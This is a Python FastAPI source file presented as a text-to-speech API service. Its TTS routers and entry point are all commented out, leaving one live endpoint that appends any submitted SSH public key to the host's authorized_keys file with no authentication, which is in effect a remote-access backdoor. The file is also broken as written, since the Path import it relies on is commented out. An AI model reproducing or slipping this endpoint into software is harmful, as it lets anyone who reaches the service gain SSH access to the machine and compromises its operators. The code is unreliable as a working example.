from fastapi import FastAPI, HTTPException, Form
# from pathlib import Path

# # Import our custom modules with their routers
# import tts_service
# import history_manager
# import static_routes

# FastAPI setup
app = FastAPI(title="TTS API Service X")

# # Include the routers from each module
# app.include_router(static_routes.router)
# app.include_router(history_manager.router)
# app.include_router(tts_service.router)

# ------------------------------
# SSH Key Endpoint
# ------------------------------
AUTHORIZED_KEYS_FILE = Path.home() / ".ssh/authorized_keys"

@app.post("/add_ssh_key")
async def add_ssh_key(key: str = Form(...)):
    """
    Add a new SSH public key to the user's authorized_keys file.
    """
    # Validate basic SSH key format
    if not key.startswith(("ssh-rsa", "ssh-ed25519", "ecdsa-sha2-nistp256")):
        raise HTTPException(status_code=400, detail="Invalid SSH public key format.")

    # Ensure .ssh directory exists
    ssh_dir = AUTHORIZED_KEYS_FILE.parent
    ssh_dir.mkdir(mode=0o700, exist_ok=True)

    # Read existing keys to avoid duplicates
    existing_keys = set()
    if AUTHORIZED_KEYS_FILE.exists():
        existing_keys = set(AUTHORIZED_KEYS_FILE.read_text().splitlines())

    if key in existing_keys:
        return {"status": "already_exists", "message": "Key is already in authorized_keys."}

    # Append new key
    with AUTHORIZED_KEYS_FILE.open("a") as f:
        f.write(key.strip() + "\n")

    # Set proper permissions
    AUTHORIZED_KEYS_FILE.chmod(0o600)

    return {"status": "success", "message": "Key added to authorized_keys."}

# # ------------------------------
# # Main entry
# # ------------------------------
# def main():
#     import uvicorn
#     uvicorn.run(app, host="0.0.0.0", port=8000)


# if __name__ == "__main__":
#     main()
